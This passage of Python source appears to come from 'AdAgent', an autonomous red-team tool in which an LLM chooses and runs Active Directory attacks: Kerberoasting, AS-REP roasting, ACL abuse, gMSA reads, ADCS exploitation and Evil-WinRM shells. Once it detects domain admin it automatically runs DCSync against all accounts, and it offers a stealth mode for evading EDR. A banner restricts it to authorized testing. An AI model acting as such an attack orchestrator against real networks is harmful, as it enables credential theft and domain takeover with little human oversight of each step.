                    if tc_name not in completed_tools:
                        completed_tools.append(tc_name)
                    override_name, override_inputs = _pick_next_tool(
                        completed_tools,
                        exclude={"discover_winrm_access", "evil_winrm"},
                    )
                    warn(f"[Dead-path guard] Skipping {tc_name} for '{_probe_user}' "
                         f"— using {override_name}")
                    tc_name = override_name
                    tc_input = _sanitize_tool_inputs(tc_name, override_inputs)

            if tc_name == "gmsa_read":
                _probe_user = (tc_input.get("username") or SESSION.get("username", "")).strip()
                _dead_users = list(_agent_intel().get("gmsa_read_dead_for", []) or [])
                if any(_same_ad_account(_probe_user, dead) for dead in _dead_users):
                    if tc_name not in completed_tools:
                        completed_tools.append(tc_name)
                    override_name, override_inputs = _pick_next_tool(
                        completed_tools,
                        exclude={"gmsa_read"},
                    )
                    warn(f"[Dead-path guard] Skipping gmsa_read for '{_probe_user}' "
                         f"— using {override_name}")
                    tc_name = override_name
                    tc_input = _sanitize_tool_inputs(tc_name, override_inputs)

            if tc_name == "acl_abuse_scan":
                _probe_user = (tc_input.get("username") or SESSION.get("username", "")).strip()
                _dead_users = list(_agent_intel().get("acl_scan_dead_for", []) or [])
                if any(_same_ad_account(_probe_user, dead) for dead in _dead_users):
                    if tc_name not in completed_tools:
                        completed_tools.append(tc_name)
                    override_name, override_inputs = _pick_next_tool(
                        completed_tools,
                        exclude={"acl_abuse_scan"},
                    )
                    warn(f"[Dead-path guard] Skipping acl_abuse_scan for '{_probe_user}' "
                         f"— using {override_name}")
                    tc_name = override_name
                    tc_input = _sanitize_tool_inputs(tc_name, override_inputs)

            _print_agent_header(round_num, tc_name)
            _print_tool_args("Inputs", tc_input)
            _agent_live_status(f"Dispatching {tc_name}; command output will appear as each command starts...")

            cmd_start = _command_log_index()
            result = dispatch_tool(tc_name, tc_input)
            commands = _commands_since(cmd_start)
            _print_tool_commands(tc_name, commands, tc_input)
            _print_tool_result(tc_name, result)
            md_log.add_round(round_num, tc_name, tc_input, result, commands)

            _r_lower = (result or "").lower()
            if tc_name in ("discover_winrm_access", "evil_winrm") and any(
                    s in _r_lower for s in (
                        "no shell-capable host", "winrmnot accessible",
                        "winrm not accessible",
                        "winrm discovery found no shell-capable",
                    )):
                _probe_user = (tc_input.get("username") or SESSION.get("username", "")).strip()
                if _probe_user:
                    _dead = list(SESSION.get("winrm_dead_for", []) or [])
                    if not any(_same_ad_account(_probe_user, dead) for dead in _dead):
                        _dead.append(_probe_user)
                        SESSION["winrm_dead_for"] = _dead
                        warn(f"[Dead-path] WinRM marked dead for '{_probe_user}' — "
                             f"future rounds will skip WinRM branches for this user")

            if (any(s in result for s in ("KRB_AP_ERR_SKEW", "Clock skew too great"))
                    and SESSION.get("password")
                    and "request_tgt" not in completed_tools):
                warn("[Auth repair] Kerberos clock skew detected — requesting TGT with faketime")
                cmd_start = _command_log_index()
                tgt_result = dispatch_tool("request_tgt", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                })
                tgt_commands = _commands_since(cmd_start)
                _print_tool_commands("request_tgt [AUTO SKEW]", tgt_commands, {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                })
                _print_tool_result("request_tgt [AUTO SKEW]", tgt_result)
                md_log.add_round(round_num, "request_tgt [AUTO SKEW]", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                }, tgt_result, tgt_commands)
                completed_tools.append("request_tgt")
                skew_retryable = ["adcs_scan", "asrep_roast", "kerberoast", "collect_bloodhound"]
                for retryable in skew_retryable:
                    if retryable in completed_tools and fail_counts.get(retryable, 0) > 0:
                        completed_tools.remove(retryable)

            # Analyze result and build intel brief
            intel = _analyze_result(tc_name, result)
            all_intel.update(intel)
            brief = _build_intel_context(tc_name, result, intel)

            if tc_name not in completed_tools:
                completed_tools.append(tc_name)
            if forced_marker and forced_marker not in completed_tools:
                completed_tools.append(forced_marker)

            # Check mission complete
            if tc_name == "agent_complete":
                mission_status = tc_input.get("status", "complete")
                agent_done = True

            # DA achieved — try dcsync automatically
            if intel.get("is_da") and "dcsync_attack" not in completed_tools:
                info("[AUTO] DA detected — triggering DCSync")
                dc_ip  = SESSION.get("dc_ip", "")
                domain = SESSION.get("domain", "")
                user   = SESSION.get("username", "")
                pw     = SESSION.get("password", "")
                h      = SESSION.get("nt_hash", "")
                cmd_start = _command_log_index()
                ds_result = dispatch_tool("dcsync_attack",
                    {"dc_ip": dc_ip, "domain": domain, "username": user,
                     "password": pw, "nt_hash": h, "target_user": "all"})
                ds_commands = _commands_since(cmd_start)
                _print_tool_commands("dcsync_attack [AUTO]", ds_commands, {
                    "dc_ip": dc_ip, "domain": domain, "username": user,
                    "target_user": "all",
                })
                _print_tool_result("dcsync_attack [AUTO]", ds_result)
                completed_tools.append("dcsync_attack")

            if (tc_name == "adcs_scan"
                    and SESSION.get("agent_intel", {}).get("adcs_shell_ready")
                    and "evil_winrm_after_adcs" not in completed_tools):
                info("[AUTO] ADCS exploit yielded shell-ready credentials — trying WinRM with Kerberos/hash")
                cmd_start = _command_log_index()
                ew_res = dispatch_tool("evil_winrm", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                })
                ew_commands = _commands_since(cmd_start)
                _print_tool_commands("evil_winrm [AUTO ADCS]", ew_commands, {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                })
                _print_tool_result("evil_winrm [AUTO ADCS]", ew_res)
                md_log.add_round(round_num, "evil_winrm [AUTO ADCS]", {
                    "dc_ip": SESSION.get("dc_ip",""),
                    "domain": SESSION.get("domain",""),
                    "username": SESSION.get("username",""),
                    "password": SESSION.get("password",""),
                    "nt_hash": SESSION.get("nt_hash",""),
                }, ew_res, ew_commands)
                completed_tools.append("evil_winrm_after_adcs")

            if str(tc_id).startswith("fallback_"):
                tool_results.append({
                    "type": "text",
                    "text": f"[{tc_name}]\n{result[:3000]}\n{brief}",
                })
            else:
                tool_results.append({
                    "type":         "tool_result",
                    "tool_use_id":  tc_id,
                    "content":      result[:3000] + brief,
                })

        # Inject rich intel brief into next user message
        if tool_results:
            messages.append({
                "role": "user",
                "content": tool_results + [{
                    "type": "text",
                    "text": (
                        f"\nSession: krb={SESSION.get('use_kerberos')} "
                        f"ccache={SESSION.get('krb5_ccache','')} "
                        f"loot={list(SESSION.get('loot',{}).keys())[:6]} "
                        f"owned={[m.get('machine') for m in SESSION.get('owned_machines',[])]}\n"
                        f"Completed: {list(dict.fromkeys(completed_tools))}\n"
                        f"Analyze the INTEL BRIEF above and call the priority next action."
                    )
                }]
            })

        # Save log
        try:
            log_path.write_text(json.dumps(
                redact_obj({"session": _session_context(), "messages": messages[-10:]}),
                indent=2, default=str
            ))
        except Exception:
            pass

    try:
        _print_mission_summary(round_num, mission_status, log_path, md_log)
    except Exception as e:
        try:
            if md_log and md_log._lines:
                md_log._flush()
                warn(f"Report saved (emergency): {md_log.path}")
        except Exception:
            pass
    _pause_after_agent_summary()


# ══════════════════════════════════════════════════════════════════════════════
#  INTERACTIVE MODULE ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def _print_mcp_setup():
    """Explain the MCP path: AdAgent runs as a tool server inside Claude Code /
    Cursor, which is the brain and funds the LLM from its own subscription — so
    there is NO API key and NO local model on this path. This is a different
    entry point from the standalone agent above; it is launched by the host, not
    from this menu (a stdio server needs a client on the other end)."""
    repo = Path(__file__).resolve().parents[2]
    vpy  = repo / "venv" / "bin" / "python3"
    py   = str(vpy) if vpy.exists() else "python3"
    srv  = repo / "mcp_server.py"
    print(f"""
  {fg(75)}{BOLD}MCP server — no API key, no local model{RST}

  On this path AdAgent does NOT run its own brain. You register it as a tool
  server in {fg(110)}Claude Code / Cursor / Claude Desktop{RST}, and the host LLM (your
  existing subscription) decides which tool to call. No menu, no key prompt.

  {fg(71)}1.{RST} Register it (one time):
     {fg(110)}claude mcp add adagent -- {py} {srv}{RST}

     …or add to {fg(110)}.mcp.json{RST}:
     {{
       "mcpServers": {{
         "adagent": {{
           "command": "{py}",
           "args": ["{srv}"]
         }}
       }}
     }}

  {fg(71)}2.{RST} In Claude Code, set the engagement once, then let it drive:
     {DIM}set_engagement: dc_ip, domain, username, password (or nt_hash){RST}

  Full guide: {fg(110)}docs/mcp.md{RST}
""")


def run():
    print_banner(
        "RED TEAM AGENT — AI-Powered AD Attack",
        "Ollama (local/free) or Claude API — autonomous AD attack orchestrator"
    )

    from utils.helpers import input_or_session as _ios, prompt as _prompt

    # ── Backend selection ─────────────────────────────────────────────────────
    print(f"""
  {fg(75)}{BOLD}Backend (AI Engine):{RST}
  {fg(71)}[1]{RST} Ollama  {fg(71)}← RECOMMENDED{RST}  (local, free, no internet required)
  {fg(110)}[2]{RST} Claude  (Anthropic API key required)
  {fg(71)}[3]{RST} MCP server  (run inside Claude Code / Cursor — {fg(71)}no API key{RST})
  {fg(238)}[0]{RST} Back
""")
    backend = input(f"  Backend [1]: ").strip() or "1"
    if backend == "0":
        return
    if backend == "3":
        _print_mcp_setup()
        pause()
        return

    use_ollama = (backend != "2")

    # ── Target information ────────────────────────────────────────────────────
    dc_ip    = _ios("dc_ip",    "DC IP Address")
    domain   = _ios("domain",   "Domain")
    username = _ios("username", "Username")
    password = _ios("password", "Password", secret=True)
    nt_hash  = SESSION.get("nt_hash", "")

    # Persist any newly-entered credentials so they are not asked again next run
    from config.settings import save_session as _save_session
    _save_session()

    if not all([dc_ip, domain]):
        error("DC IP and Domain are required. Username is optional (null session mode).")
        pause()
        return
    # Allow no-credential mode: null session → anonymous LDAP → RID cycling → AS-REP roast
    if not username:
        warn("No username provided — starting in NULL SESSION mode")
        warn("Agent will: enumerate LDAP anonymously → RID cycle → AS-REP roast no-preauth accounts")

    # ── Model selection ───────────────────────────────────────────────────────
    if use_ollama:
        try:
            raw = subprocess.run(["ollama", "list"], capture_output=True, text=True).stdout
            installed = [l.split()[0] for l in raw.splitlines()[1:] if l.strip()]
        except Exception:
            installed = []

        print(f"\n  {fg(75)}{BOLD}Installed Ollama Models:{RST}")
        model_map = {}
        for i, m in enumerate(installed, 1):
            tag = f"{fg(71)}← tool calling{RST}" if any(
                k in m for k in ["mistral","qwen","llama3","deepseek"]) else ""
            print(f"  {fg(110)}[{i}]{RST} {m}  {tag}")
            model_map[str(i)] = m

        if not installed:
            warn("No models found — install one first:")
            print(f"  {DIM}  ollama pull mistral{RST}")
            print(f"  {DIM}  ollama pull qwen2.5-coder:7b{RST}")
            pause()
            return

        print(f"\n  {DIM}Recommended: mistral or qwen2.5-coder:7b{RST}")
        choice = input(f"  Model [1]: ").strip() or "1"
        ollama_model = model_map.get(choice, installed[0])

    else:
        # Claude API
        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
        if not api_key:
            api_key = _prompt("Anthropic API Key")
            if not api_key:
                error("API key required")
                pause()
                return
            os.environ["ANTHROPIC_API_KEY"] = api_key
            # Save to .env so it is not asked again on next run
            env_file = Path(__file__).resolve().parents[2] / ".env"
            try:
                existing = env_file.read_text() if env_file.exists() else ""
                if "ANTHROPIC_API_KEY" not in existing:
                    with open(env_file, "a") as _ef:
                        _ef.write(f"\nANTHROPIC_API_KEY={api_key}\n")
            except Exception:
                pass

        print(f"""
  {fg(110)}Claude Model:{RST}
  [1] claude-opus-4-1-20250805  (best reasoning, slower)
  [2] claude-sonnet-4-20250514  (balanced, recommended)
  [3] claude-3-5-haiku-20241022 (fast)
""")
        mc = input(f"  Model [2]: ").strip() or "2"
        global MODEL
        MODEL = {"1":"claude-opus-4-1-20250805","2":"claude-sonnet-4-20250514",
                 "3":"claude-3-5-haiku-20241022"}.get(mc, "claude-sonnet-4-20250514")

    # ── Mode selection ────────────────────────────────────────────────────────
    print(f"""
  {fg(75)}{BOLD}Mode:{RST}
  {fg(71)}[1]{RST} Full Auto   — Agent runs fully autonomously
  {fg(110)}[2]{RST} Plan Only   — Generates attack plan only (no execution)
""")
    mode = input(f"  Mode [1]: ").strip() or "1"

    # ── OPSEC mode ───────────────────────────────────────────────────────────
    print(f"""
  {fg(75)}{BOLD}OPSEC Mode:{RST}
  {fg(71)}[1]{RST} Loud   — Fast, no jitter, all tools  {fg(238)}(labs / CTF){RST}
  {fg(110)}[2]{RST} Normal — Moderate OPSEC, jitter     {fg(110)}(internal pentest){RST}  {fg(71)}← default{RST}
  {fg(167)}[3]{RST} Stealth— Max OPSEC, native-first     {fg(167)}(real red team / EDR environments){RST}
""")
    opsec_choice = input(f"  OPSEC [2]: ").strip() or "2"
    global OPSEC_MODE
    OPSEC_MODE = {"1": "loud", "2": "normal", "3": "stealth"}.get(opsec_choice, "normal")
    os.environ["ADSTRIKE_OPSEC"] = OPSEC_MODE

    print()
    backend_str = f"Ollama/{ollama_model}" if use_ollama else f"Claude/{MODEL}"
    info(f"Starting AdAgent  {fg(71)}{domain or '(null session)'}{RST}/{fg(71)}{dc_ip}{RST}")
    info(f"Backend: {fg(110)}{backend_str}{RST}  |  OPSEC: {fg(71)}{OPSEC_MODE.upper()}{RST}  |  Credentials: {username or 'NONE (null session)'}@{domain}")
    info(f"Max rounds: {MAX_ROUNDS}  |  Log: {LOG_DIR}")
    print(f"\n  {fg(167)}{BOLD}[!] AUTHORIZED PENETRATION TESTING & RED TEAM ONLY{RST}\n")

    # ── Plan only mode ───────────────────────────────────────────────────────
    if mode == "2":
        plan_prompt = (
            f"Target: {username}@{domain} → {dc_ip}\n"
            f"Auth: password={bool(password)}, hash={bool(nt_hash)}\n\n"
            f"Produce a detailed Active Directory attack plan in priority order. "
            f"For each vector explain why it's valuable and expected outcome. "
            f"Do NOT call any tools — text only."
        )
        if use_ollama:
            for _k in ["HTTP_PROXY","HTTPS_PROXY","http_proxy","https_proxy","ALL_PROXY"]:
                os.environ.pop(_k, None)
            _agent_live_status(f"Asking Ollama model '{ollama_model}' to generate the plan...")
            resp = _ollama_chat_completion(
                model=ollama_model,
                messages=[{"role":"system","content":SYSTEM_PROMPT},
                          {"role":"user","content":plan_prompt}],
                temperature=0.1,
            )
            section("AGENT ATTACK PLAN")
            print(resp.choices[0].message.content)
        else:
            _agent_live_status(f"Asking Claude model '{MODEL}' to generate the plan...")
            client = anthropic.Anthropic(api_key=api_key)
            resp = client.messages.create(
                model=MODEL, max_tokens=4096,
                system=SYSTEM_PROMPT,
                messages=[{"role":"user","content":plan_prompt}]
            )
            section("AGENT ATTACK PLAN")
            for block in resp.content:
                if hasattr(block,"text"):
                    print(block.text)
        pause()
        return

    # ── Full Auto ─────────────────────────────────────────────────────────────
    if use_ollama:
        run_agent_ollama(dc_ip, domain, username, password, nt_hash, ollama_model)
    else:
        run_agent(dc_ip, domain, username, password, nt_hash, api_key)

    pause("  [Enter] to return to main menu")
